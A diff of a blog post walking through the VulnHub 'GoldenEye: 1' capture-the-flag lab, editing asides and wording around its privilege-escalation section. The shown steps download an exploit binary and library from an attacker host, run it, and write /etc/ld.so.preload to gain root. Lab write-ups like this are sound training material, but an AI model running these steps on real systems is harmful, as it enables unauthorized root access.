@@ -3,7 +3,7 @@ layout: post
 title: "GoldenEye: 1 Walkthrough"
 subtitle: "Shaken, Not Stirred"
 date: 2018-09-14 21:03:27 +0000
-last_modified_at: 2018-09-15 05:08:44 +0000
+last_modified_at: 2018-09-15 05:17:12 +0000
 category: Walkthrough
 tags: [VulnHub, GoldenEye]
 comments: true
@@ -309,6 +309,8 @@ Let's give the script a shot.
 
 ![59d6ecf7.png](/assets/images/posts/goldeneye-1-walkthrough/59d6ecf7.png)
 
+Woohoo. I got shell.
+
 ### Privilege Escalation
 
 First of all, I notice this is a pretty old Ubuntu running an old kernel.
@@ -356,7 +358,7 @@ _On the remote shell, do the following:_
 1. `$ wget -O /tmp/ofs 192.168.30.128/ofs`
 2. `$ chmod +x /tmp/ofs`
 3. `$ wget -O /tmp/ofs-lib.so 192.168.30.128/ofs-lib.so`
-4. `$ /tmp/ofs` to create `/etc/ld.so.preload`. Hit Enter to ignore the password prompt.
+4. Run `/tmp/ofs` to create `/etc/ld.so.preload`. Hit Enter to ignore the password prompt.
 4. `$ echo /tmp/ofs-lib.so > /etc/ld.so.preload`
 5. `$ /tmp/ofs`
 
@@ -364,7 +366,11 @@ _On the remote shell, do the following:_
 
 ### To the GoldenEye Access Codes
 
+Time to get the flag!
+
 ![d71702c6.png](/assets/images/posts/goldeneye-1-walkthrough/d71702c6.png)
+
+:thumbsup:
 
 ![038f636c.png](/assets/images/posts/goldeneye-1-walkthrough/038f636c.png)
 
@@ -372,7 +378,7 @@ _On the remote shell, do the following:_
 
 ### Afterthought
 
-Although the creator of this VM said no exploit development and/or buffer overflows are needed to get `root`, a good understanding of the exploits involved is, in my humble opinion, necessary. As much as I like Metasploit, I prefer to write my own tools.
+Although the creator of this VM said exploit development and/or buffer overflows aren't needed to get `root`, a good understanding of the exploits involved is, in my humble opinion, necessary. As much as I like Metasploit, I still prefer to write my own tools.
 
 [1]: https://www.vulnhub.com/entry/goldeneye-1,240/
 [2]: https://www.vulnhub.com/
